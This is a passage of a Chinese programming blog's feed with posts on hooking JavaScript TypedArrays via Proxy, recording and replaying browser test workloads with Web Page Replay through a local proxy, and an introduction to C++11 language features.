class="number">2</span>]</span><br><span class="line">&lt;&lt;t.js:<span class="number">94</span> get index <span class="number">2</span></span><br><span class="line">&lt;&lt;<span class="number">3</span></span><br><span class="line">&gt;&gt;a.constructor</span><br><span class="line">&lt;&lt;<span class="built_in">Float32Array</span>() &#123; [native code]  &#125;</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
<p>本做法应该还有以下局限：</p>
<h2 id="u6027_u80FD"><a href="#u6027_u80FD" class="headerlink" title="性能"></a>性能</h2><p>大规模下创建一个1000000的数组内存占用飙升，因为创建了太多的get/set函数。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ori = <span class="keyword">new</span> _Float32Array(<span class="number">1000000</span>)</span><br><span class="line">Float32Array[<span class="number">1000000</span>]</span><br><span class="line">mod = <span class="keyword">new</span> Float32Array(<span class="number">1000000</span>)</span><br><span class="line">Float32Array &#123;a: Float32Array[<span class="number">1000000</span>], isDirty: <span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line">console.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;var t = mod[i];t++;mod[i]=t;&#125;;console.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">VM741:<span class="number">2</span> a: <span class="number">5313.409</span>ms</span><br><span class="line"></span><br><span class="line">console.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;var t=ori[i];t++;ori[i]=t;&#125;;console.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">VM743:<span class="number">2</span> a: <span class="number">3884.074</span>ms</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<h2 id="u5185_u90E8_u521B_u5EFA_u5E76_u8FD4_u56DE_u7684TypedArray_u65E0_u6CD5Hook"><a href="#u5185_u90E8_u521B_u5EFA_u5E76_u8FD4_u56DE_u7684TypedArray_u65E0_u6CD5Hook" class="headerlink" title="内部创建并返回的TypedArray无法Hook"></a>内部创建并返回的TypedArray无法Hook</h2><p>比如类似<code>subarray()</code>函数，返回值便是原生的TypedArray了，需要在Proxy对象中特殊处理一下。</p>
<h2 id="u5728_u67D0_u4E9B_u573A_u666F_u4E0B_u4E0D_u80FD_u5B8C_u5168_u66FF_u4EE3_u539F_u6709_u7684TypedArray"><a href="#u5728_u67D0_u4E9B_u573A_u666F_u4E0B_u4E0D_u80FD_u5B8C_u5168_u66FF_u4EE3_u539F_u6709_u7684TypedArray" class="headerlink" title="在某些场景下不能完全替代原有的TypedArray"></a>在某些场景下不能完全替代原有的TypedArray</h2><p>可以尽量模拟原生TypedArray的对外Api，不过还是有些场景可能照顾不到。</p>
<h1 id="ES6_Proxy__26amp_3B_Reflect"><a href="#ES6_Proxy__26amp_3B_Reflect" class="headerlink" title="ES6 Proxy &amp; Reflect"></a>ES6 Proxy &amp; Reflect</h1><p>Chrome中还没有实现，使用Firefox一试。对某对象加一层通用的代理，非常容易实现。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> ori = <span class="keyword">new</span> <span class="built_in">Float32Array</span>(<span class="number">1000000</span>);</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Proxy</span>(aa, &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> (<span class="params">target, key, receiver</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, key, receiver);          </span><br><span class="line">    &#125;,</span><br><span class="line">    set: <span class="function"><span class="keyword">function</span> (<span class="params">target, key, value, receiver</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, key, value, receiver);              </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;<span class="keyword">var</span> t = aa[i];t++;aa[i]=t;&#125;;<span class="built_in">console</span>.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">a: 计时器开始</span><br><span class="line">a: <span class="number">1738.62</span>ms</span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;<span class="keyword">var</span> t = obj[i];t++;obj[i]=t;&#125;;<span class="built_in">console</span>.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">a: 计时器开始</span><br><span class="line">a: <span class="number">3226.16</span>ms</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>如果还有更好的方法，欢迎讨论。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="u95EE_u9898_u63CF_u8FF0"><a href="#u95EE_u9898_u63CF_u8FF0" class="headerlink" title="问题描述"></a>问题描述</h1><p>目前在做的小项目中，我们在浏览器中通过Hook浏]]>
    </summary>
    
      <category term="frontend" scheme="http://yqf3139.github.io/tags/frontend/"/>
    
      <category term="javascript" scheme="http://yqf3139.github.io/tags/javascript/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用 Web Page Replay]]></title>
    <link href="http://yqf3139.github.io/2015/11/21/use-web-page-replay/"/>
    <id>http://yqf3139.github.io/2015/11/21/use-web-page-replay/</id>
    <published>2015-11-21T14:24:47.000Z</published>
    <updated>2015-12-26T06:44:46.738Z</updated>
    <content type="html"><![CDATA[<h1 id="u4E3A_u4EC0_u4E48_u9700_u8981_u4F7F_u7528_Web_Page_Replay_uFF1F"><a href="#u4E3A_u4EC0_u4E48_u9700_u8981_u4F7F_u7528_Web_Page_Replay_uFF1F" class="headerlink" title="为什么需要使用 Web Page Replay？"></a>为什么需要使用 Web Page Replay？</h1><h2 id="u9700_u6C42_u7684_u4EA7_u751F"><a href="#u9700_u6C42_u7684_u4EA7_u751F" class="headerlink" title="需求的产生"></a>需求的产生</h2><p>实习期间，我们经常用各种Workload对浏览器进行测试，初期大量的Workload都是手工收集或是开源的，再整理到小组内的服务器上。<br>后期产生了抓取浏览器中Javascript Trace并实时送至后端分析的需求，例如我们希望将某些网页的Webgl调用全部记录下来，或者是将用户的各种互动事件记录下来，又不用手工地修改Workload，便有了我目前写的代理服务器，它能对我们关注的Workload注入Javascript脚本，比和后端代理服务器建立通信，高效地把Trace发送到后端，并易于扩展各种功能的后端。</p>
<p>一个更加常见的需求便是Localize Real life Workload，我们需要自动化地测试很多网上不开源的Workload，虽然通过我的代理服务器，注入分析不需要人工干预了，不过在公司内连接外网Workload是痛苦的。尤其是某些Workload每次需要加载50M的资源文件，一旦浏览器cache失效便要登上很长时间。而且网上的Workload在不断变动，无法直接进行组内Workload的统一化，针对浏览器测试时很难做到组内环境一致。</p>
<p>所以一个最基本的需求就是我们访问该Workload一次，就将所有经过代理服务器的request和response本地存档，称为record；等到下次重复测试时，匹配所有的request，直接发回对应的response，这样便能做到本地replay该workload了。</p>
<p>最近进哥说想加入这个功能在我们的代理服务器上，但由于当初没有考虑到这个功能，并且组内提出可以复用Telemetry中的Webpage Replay功能，可以将其加在我代理服务器的外层，便可以像是管道一样进行功能的扩展。正好我最近在看的Webgl Workload需要加载的资源很多，进行Replay极大加快了我自测的速度。</p>
<h2 id="HTTP/HTTPS_u4EE3_u7406_u670D_u52A1_u5668_u7684_u5999_u7528"><a href="#HTTP/HTTPS_u4EE3_u7406_u670D_u52A1_u5668_u7684_u5999_u7528" class="headerlink" title="HTTP/HTTPS代理服务器的妙用"></a>HTTP/HTTPS代理服务器的妙用</h2><p>刚才说的两个需求只是代理服务器的一个很小的用处，还有大量的妙用如下：</p>
<ul>
<li>科学上网，不过HTTP代理一般只能作为国内跳板。</li>
<li>反向代理，做网站的入口，自动后端负载均衡、流量审查、压缩、简单的逻辑直接部署等等功能。</li>
<li>测试平台，之前看到阿里的Anyproxy便是这个作用，可以记录下所有接入终端（手机、平板）的HTTP网路请求，方便修改Header，Cookie，进行颠簸的网路环境的模拟等等，也提供Replay。</li>
<li>内网上网，公司内部方便屏蔽外界的攻击，并限制员工上网，审查上网记录，当然有福利便是可以直接提供梯子。</li>
</ul>
<h1 id="Web_Page_Replay__u5B9E_u73B0_u539F_u7406_u7684_u7B80_u5355_u7406_u89E3"><a href="#Web_Page_Replay__u5B9E_u73B0_u539F_u7406_u7684_u7B80_u5355_u7406_u89E3" class="headerlink" title="Web Page Replay 实现原理的简单理解"></a>Web Page Replay 实现原理的简单理解</h1><p>Replay工具可以运行在DNS劫持和HTTP代理两种模式下，实质上DNS劫持简化了设置浏览器代理的过程。</p>
<p><img src="/images/WebPageReplayDiagram.png" alt="replay"></p>
<p>盗图一张，可以看出Replay劫持模式便是在本机启动一个DNS服务器和Web服务器，分别占用53和80端口。<br>一般情况下，浏览器访问一个页面先进行域名的DNS解析，然后先目标服务器发送request。Record时，DNS全部返回127.0.0.1，浏览器便将请求发送给本机的服务器，服务器随后便代理请求后返回，并记录下本次request和response。Replay时本机服务器直接匹配存档文件。<br>DNS劫持的好处便是不用设置浏览器代理了，缺点也很明显：</p>
<ul>
<li>如果request写明ip时，便绕过了本地的DNS请求（类似Host梯子），便无法实现replay。</li>
<li>访问端口不是标准的80和443也会直接在record环节出错。</li>
<li>需要占用本机的53,80,443端口，影响本机的原有的服务。</li>
</ul>
<p>所以这个工具也支持直接设置代理的模式，如果只是浏览器的话使用比较简单。想将多个代理服务器管道化，设置每一层的代理为上一层代理就可以了。</p>
<p>接下来粗略了解一下代理服务器的工作方式。</p>
<p>对于HTTP:</p>
<p>代理服务器通过TCP Socket接收到来自客户端的请求。它从HTTP的Header中解析出host和port，如果是域名的话先DNS解析，然后就是Roundtrip最终返回真实的response，这里所有的内容都是代理服务器可见的，可以随意修改。</p>
<p>如果我们这里使用nc，可以首先不通过代理访问百度：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nc baidu.<span class="keyword">com</span> <span class="number">80</span></span><br><span class="line">  GET / HTTP/<span class="number">1.1</span></span><br><span class="line">  Hos<span class="variable">t:</span> baidu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure></p>
<p>可以看见返回的response：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">14</span> Aug <span class="number">2015</span> <span class="number">07</span>:<span class="number">55</span>:<span class="number">26</span> GMT</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<p>如果通过本机8080代理服务器：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nc localhost <span class="number">8080</span></span><br><span class="line">  <span class="preprocessor">GET</span> http://<span class="keyword">baidu.com </span>HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="label">  Host:</span> <span class="keyword">baidu.com</span></span><br></pre></td></tr></table></figure></p>
<p>代理服务器可能会输出如下日志：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">INFO:</span> Got request  baidu.com GET <span class="string">http:</span><span class="comment">//baidu.com</span></span><br><span class="line"><span class="string">INFO:</span> Sending request GET <span class="string">http:</span><span class="comment">//baidu.com</span></span><br><span class="line"><span class="string">INFO:</span> Received response <span class="number">200</span> OK</span><br></pre></td></tr></table></figure></p>
<p>对于HTTPS:<br>代理服务收到客户端的CONNECT请求，但只可见host和port，代理服务器只能在客户端和服务器中建立起socket连接并相互双工传递，如果需要修改内容的话，需要进行中间人攻击。</p>
<h1 id="Web_Page_Replay__u4F7F_u7528_u5B9E_u6218"><a href="#Web_Page_Replay__u4F7F_u7528_u5B9E_u6218" class="headerlink" title="Web Page Replay 使用实战"></a>Web Page Replay 使用实战</h1><h2 id="u4F7F_u7528DNS_u52AB_u6301_u6A21_u5F0F"><a href="#u4F7F_u7528DNS_u52AB_u6301_u6A21_u5F0F" class="headerlink" title="使用DNS劫持模式"></a>使用DNS劫持模式</h2><h2 id="u4F7F_u7528_u76F4_u63A5_u4EE3_u7406_u6A21_u5F0F"><a href="#u4F7F_u7528_u76F4_u63A5_u4EE3_u7406_u6A21_u5F0F" class="headerlink" title="使用直接代理模式"></a>使用直接代理模式</h2><h1 id="u6E90_u7801_u5206_u6790"><a href="#u6E90_u7801_u5206_u6790" class="headerlink" title="源码分析"></a>源码分析</h1>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="u4E3A_u4EC0_u4E48_u9700_u8981_u4F7F_u7528_Web_Page_Replay_uFF1F"><a href="#u4E3A_u4EC0_u4E48_u9700_u8981_u4F7F_u7528_Web_Page_Replay]]>
    </summary>
    
      <category term="browser" scheme="http://yqf3139.github.io/tags/browser/"/>
    
      <category term="network" scheme="http://yqf3139.github.io/tags/network/"/>
    
      <category term="proxy" scheme="http://yqf3139.github.io/tags/proxy/"/>
    
      <category term="testing" scheme="http://yqf3139.github.io/tags/testing/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[初尝 C++ 11]]></title>
    <link href="http://yqf3139.github.io/2015/11/15/new-in-cpp11/"/>
    <id>http://yqf3139.github.io/2015/11/15/new-in-cpp11/</id>
    <published>2015-11-15T06:50:31.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p>我学的第一门语言便是C++，不过由于后期一直没有使用C++写过较大的项目，一直处于入门阶段。最近实习，第一个小项目便是搭建一个代理服务器，Manager处于对性能的要求，希望我用C++实现。当时比较懒，觉得用C++重写代理服务器进展会比较慢，便说服Manager让我使用Golang，配合一些现有的框架实现。现在看起来达到了预期效果，但也缺少了锻炼C++能力的机会。</p>
<p>现有的项目中，Android App几乎都是使用NDK进行开发的，近期我们有进行重构和性能优化的打算。恰逢其机，进哥在每周的Code Study上进行了 <code>C++11</code> 新标准的分享，我也借助周末的机会稍作整理。</p>
<h1 id="u6982_u89C8"><a href="#u6982_u89C8" class="headerlink" title="概览"></a>概览</h1><p><img src="/images/cpp-timeline.png" alt="timeline"></p>
<p>C++自98标准化后，变动不大。直到近年开始不断推出新的标准，我们现在似乎还处在不断改进的中期。</p>
<p>按照Manager的说法，改动可以被划分入如下几类：</p>
<ul>
<li>语法糖类。让代码更加简洁，易于理解。</li>
<li>显式地进行语义申明。填之前留下的坑，并让代码更加符合最佳实践。</li>
<li>其他语言的新特性。</li>
<li>标准库的完善。</li>
</ul>
<p>Manager之前是做编译器的，所以他觉得大部分修改是标准委员会拍拍大脑制定的。的确，语言的设计不是大杂烩，维持一个简洁规范的语法规则是很有必要的，C++由于需要向前兼容，看起来便不简洁了。</p>
<h1 id="u8BED_u6CD5_u7CD6"><a href="#u8BED_u6CD5_u7CD6" class="headerlink" title="语法糖"></a>语法糖</h1><p>这部分是Manager痛斥的，不过也是我们大家喜闻乐见的一些小改进。</p>
<h2 id="Auto_u5173_u952E_u5B57"><a href="#Auto_u5173_u952E_u5B57" class="headerlink" title="Auto关键字"></a>Auto关键字</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> x = <span class="number">144000000000000</span>;</span><br><span class="line"><span class="keyword">auto</span> y = <span class="built_in">string</span>(<span class="string">"hello"</span>);</span><br><span class="line"><span class="keyword">auto</span> z = y + <span class="string">", world"</span>;</span><br><span class="line"><span class="keyword">auto</span> a = someFunc();</span><br></pre></td></tr></table></figure>
<p>这里主要的便利还是减少了类型申明的冗余，不过对于他人来说可读性会很差。比如<code>auto x = 0;</code>只会推断为int，可能会带来不必要的内存占用（比如范围只需要-128-127），或是溢出。如果需要使用STL的string也需要使用类名，不然会被推断为char数组。</p>
<p>最佳实践还是在能明显看出变量类型的时候使用，如容器的迭代器申明。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::const_iterator ci = vi.begin();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = vec.begin();i != vec.end();i++) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (*i) &lt;&lt; <span class="built_in">std</span>::endl; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不过还是有坑，配合新出的for loop时注意引用的问题,默认是一个拷贝。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;i : vec) &#123;</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="decltype_u81EA_u52A8_u5316_u63A8_u5BFC"><a href="#decltype_u81EA_u52A8_u5316_u63A8_u5BFC" class="headerlink" title="decltype自动化推导"></a>decltype自动化推导</h2><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typedef decltype<span class="list">(<span class="keyword">someFunc</span><span class="list">()</span>)</span> ITER</span><br><span class="line">auto a = someFunc<span class="list">()</span><span class="comment">; // 比如返回值为vector&lt;int&gt;::const_iterator</span></span><br><span class="line">decltype<span class="list">(<span class="keyword">a</span>)</span> b<span class="comment">;       // 自动推导为和a一样的类型</span></span><br></pre></td></tr></table></figure>
<p>看到定义函数指针的用法，比较实用<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myfunc</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">decltype</span>(&amp;myfunc) pfunc = myfunc;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (*pfunc)(<span class="number">0</span>) &lt;&lt;<span class="built_in">std</span>::endl;</span><br><span class="line">    pfunc = [](<span class="keyword">int</span> a)&#123;<span class="keyword">return</span> a+<span class="number">1</span>;&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (*pfunc)(<span class="number">0</span>) &lt;&lt;<span class="built_in">std</span>::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="u521D_u59CB_u5316_u8BED_u6CD5"><a href="#u521D_u59CB_u5316_u8BED_u6CD5" class="headerlink" title="初始化语法"></a>初始化语法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C c &#123;<span class="number">0</span>,<span class="number">0</span>&#125;; <span class="comment">//C++11 only. 相当于: C c(0,0);</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span>* a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>] &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>  &#125;; /C++<span class="number">11</span> only</span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> X &#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    X() : a&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125; &#123;&#125; <span class="comment">//C++11, member array initializer</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>看完上面几个例子，似乎很多类型的初始化都可以使用{}来统一了。<br>不过Manager指出其实只是新增加了<code>new int[3]{1,2,3};</code>这一类的，其他的方法是为了大一统加上的。这样看来，初始化的方法的确比较混乱了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(C c)</span></span>&#123;&#125;</span><br><span class="line">foo(&#123;<span class="number">0</span>,<span class="number">0</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>其实可以这样写，进行自动化推导后初始化传入的结构体。不过不太易于阅读。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; vs=&#123; <span class="string">"first"</span>, <span class="string">"second"</span>, <span class="string">"third"</span> &#125;;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; singers =</span><br><span class="line">&#123; &#123;<span class="string">"Lady Gaga"</span>, <span class="string">"+1 (212) 555-7890"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"Beyonce Knowles"</span>, <span class="string">"+1 (212) 555-0987"</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>
<p>适合进行容器初始化。以前map的初始化不友好。</p>
<p>map和表达式配合，有一种Javascript的感觉。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">decltype</span>(&amp;handler)&gt; handlers =</span><br><span class="line">    &#123; </span><br><span class="line">        &#123;<span class="string">"ori"</span>, [](<span class="keyword">int</span> a)&#123;<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a &lt;&lt; <span class="built_in">std</span>::endl;&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">"plusone"</span>, [](<span class="keyword">int</span> a)&#123;<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a+<span class="number">1</span> &lt;&lt; <span class="built_in">std</span>::endl;&#125;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    (*handlers[<span class="string">"ori"</span>])(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="u660E_u6670_u8BED_u4E49_u7684_u6539_u52A8"><a href="#u660E_u6670_u8BED_u4E49_u7684_u6539_u52A8" class="headerlink" title="明晰语义的改动"></a>明晰语义的改动</h1><h2 id="delete/default_u4FEE_u9970"><a href="#delete/default_u4FEE_u9970" class="headerlink" title="delete/default修饰"></a>delete/default修饰</h2><p>我们经常需要单例模式需要<code>private</code>构造函数，可以使用<code>delete</code>告诉编译器不生成默认的构造函数。<br>不过可以申明为<code>private</code>，似乎不是特别的必要。</p>
<p>下面例子是一个比较好的实践：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">double</span>)</span> </span>= <span class="keyword">delete</span>;</span><br></pre></td></tr></table></figure>
<p>明晰了使用时不能编译器遇到传入double的情况，不会自动做类型转换了</p>
<h2 id="nullptr_2C_u6709_u7C7B_u578B_u7684NULL"><a href="#nullptr_2C_u6709_u7C7B_u578B_u7684NULL" class="headerlink" title="nullptr,有类型的NULL"></a>nullptr,有类型的NULL</h2><p><code>NULL</code>在函数重载时会产生歧义，导致具体逻辑得看编译器实现了。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span>)</span></span>; <span class="comment">//#1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">char</span> *)</span></span>;<span class="comment">//#2</span></span><br><span class="line"><span class="comment">//C++03</span></span><br><span class="line">f(<span class="number">0</span>); <span class="comment">//二义性</span></span><br><span class="line"><span class="comment">//C++11</span></span><br><span class="line">f(<span class="literal">nullptr</span>) <span class="comment">//无二义性，调用f(char*)</span></span><br></pre></td></tr></table></figure></p>
<h2 id="final/override_u4FEE_u9970"><a href="#final/override_u4FEE_u9970" class="headerlink" title="final/override修饰"></a>final/override修饰</h2><p><code>final</code>的使用不用多说了。<code>override</code>我们当时讨论了很久其存在的必要性。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"in A"</span> &lt;&lt; <span class="built_in">std</span>::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> B : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a)</span> override </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"in B"</span> &lt;&lt; <span class="built_in">std</span>::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    A* p = <span class="keyword">new</span> B();</span><br><span class="line">    p-&gt;f(<span class="number">1.1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面例子中，最终调用到了B的f，不过如果A的f参数改为<code>double</code>，会由<code>override</code>产生编译错误。<br>如果不加的话，就会绕过B::f。</p>
